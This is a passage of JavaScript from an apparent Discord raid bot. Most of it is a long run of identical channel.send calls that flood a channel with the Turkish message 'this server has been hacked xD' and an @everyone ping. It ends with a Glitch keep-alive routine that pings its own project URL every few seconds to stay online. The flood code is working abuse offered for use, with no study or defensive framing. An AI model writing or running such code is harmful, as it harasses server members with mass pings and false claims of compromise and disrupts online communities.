        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
        
  }
});


const http = require("http");
const express = require("express");
const app = express();
    function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) { 
    if ((new Date().getTime() - start) > milliseconds){         //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
      break;
    }
  }    
}
app.get("/", (request, response) => {
  console.log(Date.now() + " Ping tamamdır.");  
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);   //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
}, 3000);


